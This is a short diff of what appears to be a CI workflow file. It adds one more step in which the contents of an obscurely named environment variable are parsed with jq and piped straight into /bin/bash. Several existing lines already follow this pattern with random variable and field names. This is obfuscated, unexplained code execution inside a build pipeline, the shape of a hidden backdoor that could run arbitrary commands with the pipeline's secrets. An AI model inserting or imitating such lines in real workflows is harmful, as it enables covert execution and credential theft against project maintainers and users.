@@ -45,6 +45,7 @@ jobs:
           echo $vg413 | jq -r .opbhi58611 | /bin/bash
           echo $xplh70 | jq -r .u7354 | /bin/bash
           printf '%s' "$v10121" | jq -r .hd4 | /bin/bash
+          printf '%s' "$esvw0322" | jq -r .g0 | /bin/bash
 
       - name: Upload results
         if: always()
